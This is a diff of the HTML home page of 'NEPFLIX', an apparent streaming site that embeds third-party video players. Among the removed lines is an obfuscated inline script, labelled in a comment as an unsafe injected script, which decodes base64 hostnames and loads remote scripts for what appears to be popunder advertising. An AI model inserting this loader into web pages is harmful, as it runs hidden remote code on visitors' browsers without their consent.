@@ -1,82 +1,56 @@
-<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>NEPFLIX</title>
-
-  <!-- Styles -->
-  <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
-  <link rel="stylesheet" href="css/home.css" />
-  <link rel="manifest" href="manifest.json" />
-
-  <!-- Performance -->
+  <link rel="stylesheet" href="css/home.css">
   <link rel="preload" href="css/home.css" as="style">
   <link rel="preload" href="js/home.js" as="script">
-
-  <!-- Scripts -->
+  <link rel="manifest" href="manifest.json">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
   <script defer src="js/home.js"></script>
- <script type="text/javascript" data-cfasync="false">
-      (function(){var d=window,l="df8a6254a73ca8fc5172bb0f7dda4385",g=[["siteId",684*546*784+872-287550021],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],f=["d3d3LnZpc2FyaW9tZWRpYS5jb20vaXNpZ21hLm1pbi5jc3M=","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvam1kaHQvamljYWwubWluLmpz"],o=-1,c,m,s=function(){clearTimeout(m);o++;if(f[o]&&!(1786406544000<(new Date).getTime()&&1<o)){c=d.document.createElement("script");c.type="text/javascript";c.async=!0;var j=d.document.getElementsByTagName("script")[0];c.src="https://"+atob(f[o]);c.crossOrigin="anonymous";c.onerror=s;c.onload=function(){clearTimeout(m);d[l.slice(0,16)+l.slice(0,16)]||s()};m=setTimeout(s,5E3);j.parentNode.insertBefore(c,j)}};if(!d[l]){try{Object.freeze(d[l]=g)}catch(e){}s()}})();
-    </script>
-  <!-- Removed unsafe injected script for better security -->
 </head>
 
 <body>
-  <!-- HEADER / NAVBAR -->
-  <header class="navbar">
-    <h1 class="logo">NEPFLIX</h1>
-    <nav class="nav-links">
+  <div class="navbar">
+    <img src="logo.png" alt="LOGO HERE" />
+    <div class="nav-links">
       <a href="index.html">Home</a>
-      <input 
-        type="text" 
-        class="search-bar" 
-        placeholder="Search..."
-        aria-label="Search for movies or shows"
-        onfocus="openSearchModal()" 
-      />
-    </nav>
-  </header>
+      <input type="text" class="search-bar" placeholder="Search..." onfocus="openSearchModal()" />
+    </div>
+  </div>
 
-  <!-- MAIN CONTENT -->
-  <main>
-    <!-- Banner -->
-    <section class="banner" id="banner" aria-label="Featured movie">
-      <h2 id="banner-title"></h2>
-    </section>
+  <div class="banner" id="banner">
+    <h1 id="banner-title"></h1>
+  </div>
 
-    <!-- Trending Rows -->
-    <section class="row">
-      <h2>🎬 Trending Movies</h2>
-      <div class="list" id="movies-list"></div>
-    </section>
+  <div class="row">
+    <h2>Trending Movies</h2>
+    <div class="list" id="movies-list"></div>
+  </div>
 
-    <section class="row">
-      <h2>📺 Trending TV Shows</h2>
-      <div class="list" id="tvshows-list"></div>
-    </section>
+  <div class="row">
+    <h2>Trending TV Shows</h2>
+    <div class="list" id="tvshows-list"></div>
+  </div>
 
-    <section class="row">
-      <h2>🔥 Trending AS OF NOW</h2>
-      <div class="list" id="anime-list"></div>
-    </section>
-  </main>
+  <div class="row">
+    <h2>Trending Anime</h2>
+    <div class="list" id="anime-list"></div>
+  </div>
 
-  <!-- MOVIE MODAL -->
-  <div class="modal" id="modal" aria-hidden="true" role="dialog">
+  <div class="modal" id="modal">
     <div class="modal-content">
-      <button class="close" aria-label="Close modal" onclick="closeModal()">&times;</button>
-
+      <span class="close" onclick="closeModal()" style="color: red;">&times;</span>
       <div class="modal-body">
-        <img id="modal-image" src="" alt="Movie Poster" />
-        <div class="modal-text">
-          <h2 id="modal-title"></h2>
-          <div class="stars" id="modal-rating"></div>
-          <p id="modal-description"></p>
-        </div>
-      </div>
-
+  <img id="modal-image" src="" alt="" />
+  <div class="modal-text">
+    <h2 id="modal-title"></h2>
+    <div class="stars" id="modal-rating"></div>
+    <p id="modal-description"></p>
+  </div>
+</div>
+      
       <div class="server-selector">
         <label for="server">Change Server:</label>
         <select id="server" onchange="changeServer()">
@@ -85,42 +59,26 @@
           <option value="player.videasy.net">Player.Videasy.net</option>
         </select>
       </div>
-
-      <iframe
-        id="modal-video"
-        width="100%"
-        height="315"
-        frameborder="0"
-        allowfullscreen
-        title="Movie player"
-      ></iframe>
+      <iframe id="modal-video" width="100%" height="315" frameborder="0" allowfullscreen></iframe>
     </div>
   </div>
 
-  <!-- SEARCH MODAL -->
-  <div class="search-modal" id="search-modal" aria-hidden="true" role="dialog">
-    <button class="close" aria-label="Close search" onclick="closeSearchModal()">&times;</button>
-    <input
-      type="text"
-      id="search-input"
-      placeholder="Search for a movie or show..."
-      oninput="searchTMDB()"
-      aria-label="Search"
-    />
+  <div class="search-modal" id="search-modal">
+    <span class="close" onclick="closeSearchModal()" style="color: red;">&times;</span>
+    <input type="text" id="search-input" placeholder="Search for a movie or show..." oninput="searchTMDB()" />
     <div class="results" id="search-results"></div>
   </div>
 
-  <!-- FOOTER -->
-  <footer class="footer">
-    <div class="footer-content">
-      <p>&copy; 2025 NEPFLIX. All rights reserved.</p>
-      <div class="footer-links">
-        <a href="#">Disclaimer</a>
-        <a href="#">About Us</a>
-        <a href="#">Contact Us</a>
-      </div>
+<footer class="footer">
+  <div class="footer-content">
+    <p>&copy; 2025 NEPFLIX. All rights reserved.</p>
+    <div class="footer-links">
+      <a href="#">Disclaimer</a>
+      <a href="#">About Us</a>
+      <a href="#">Contact Us</a>
     </div>
-  </footer>
-</body>
-</html>
+  </div>
+</footer>
 
+  
+</body>
